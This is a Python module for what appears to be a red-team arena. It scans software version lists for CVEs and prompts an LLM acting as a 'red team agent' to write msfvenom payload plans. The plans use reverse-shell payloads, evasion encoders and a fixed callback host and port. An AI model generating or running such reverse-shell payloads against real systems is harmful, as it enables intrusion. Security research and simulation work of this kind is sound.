import json
import os
import sys

PROJECT_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))
if PROJECT_ROOT not in sys.path:
    sys.path.insert(0, PROJECT_ROOT)

from Code_For_RTA.payload_generation.checkVulnVersions import (
    readVersionInfo,
    checkVulnVersion,
    generateCVEJson,
)
from Code_For_LLM_Server.llm_client import LLMClient, Chat

_state = None
_round_num = 0


def set_state(state):
    global _state
    _state = state


def set_round(num):
    global _round_num
    _round_num = num


def red_scan_and_report(filename: str) -> str:
    """
    Scan a version file for vulnerabilities using the NVD CVE database and report findings.

    Args:
        filename: Path to a file with lines like "vendor:product:version".

    Returns:
        A summary of all vulnerabilities found per product.
    """
    infos = readVersionInfo(filename)
    vuln_counts = dict(checkVulnVersion(infos))
    total = sum(vuln_counts.values())

    if _state is not None:
        _state.red_scores.append(total)
        _state.log_event("RED", "scan", {"vuln_counts": vuln_counts, "total": total})

    lines = []
    for product, count in vuln_counts.items():
        lines.append(f"  {product}: {count} vulnerabilities")
    summary = f"Found {total} total vulnerabilities:\n" + "\n".join(lines)
    return summary


def _summarize_cve_data(cve_data: dict) -> str:
    """Condense CVE JSON to just product + top CVE IDs to fit in model context."""
    summary_parts = []
    for product, info in cve_data.items():
        cves = info.get("CVEs", [])
        if not cves:
            continue
        top_cves = cves[:3]
        cve_lines = []
        for c in top_cves:
            desc = c.get("Description", "")[:120]
            cve_lines.append(f"    {c['CVE_ID']}: {desc}")
        summary_parts.append(f"  {product} ({len(cves)} CVEs):\n" + "\n".join(cve_lines))
    return "\n".join(summary_parts)


# Compact msfvenom reference
MSFVENOM_REFERENCE = """msfvenom usage:
  msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <format> -e <encoder> -o <output_file>

Common payloads:
  windows/x64/meterpreter/reverse_tcp, windows/meterpreter/reverse_tcp
  linux/x64/meterpreter/reverse_tcp, linux/x86/shell_reverse_tcp
  bsd/x64/shell_reverse_tcp, osx/x64/meterpreter/reverse_tcp

Common formats: exe, elf, macho, raw, py, bash, war, jsp
Common encoders: x86/shikata_ga_nai, x64/xor_dynamic, x86/fnstenv_mov
Common architectures: x86, x64, armle, aarch64"""


def red_generate_exploits(filename: str) -> str:
    """
    Generate CVE JSON and msfvenom payload plans for vulnerable software in the file. Does NOT execute payloads.

    Args:
        filename: Path to a file with lines like "vendor:product:version".

    Returns:
        The exploit payload plan as text.
    """
    infos = readVersionInfo(filename)
    cve_output = _state.artifact_path(f"cve_round{_round_num}.json") if _state else f"arena_cve_round{_round_num}.json"
    generateCVEJson(infos, cve_output)

    with open(cve_output, "r") as f:
        cve_data = json.load(f)

    has_cves = any(len(v.get("CVEs", [])) > 0 for v in cve_data.values())
    if not has_cves:
        return "No CVEs found, no payload plan needed."

    cve_summary = _summarize_cve_data(cve_data)

    prompt = f"""You are a red team agent. Generate msfvenom payload plans for each vulnerable product below.

{MSFVENOM_REFERENCE}

LHOST=192.168.1.10
LPORT=4444

Vulnerable software:
{cve_summary}

Return a JSON list. Each entry must have: target, arch, payload, encoder, format, msfvenom_command.
Pick the correct OS/arch based on the product (e.g., nginx=linux, openssh on openbsd=bsd).
Return ONLY valid JSON, no explanation."""

    model = LLMClient()
    chat = Chat("You generate msfvenom payload plans as JSON. Return only valid JSON.")
    chat.add_user_message(prompt)
    plan_text = model.respond(chat)

    if "```" in plan_text:
        plan_text = plan_text.split("```")[1]
        if plan_text.startswith("json"):
            plan_text = plan_text[4:]
        plan_text = plan_text.strip()

    plan_path = _state.artifact_path(f"payload_plan_round{_round_num}.json") if _state else f"arena_payload_plan_round{_round_num}.json"
    with open(plan_path, "w") as f:
        f.write(plan_text)

    if _state is not None:
        _state.log_event("RED", "payload_plan", {"plan_path": plan_path})

    return f"Payload plan saved to {plan_path}:\n{plan_text}"
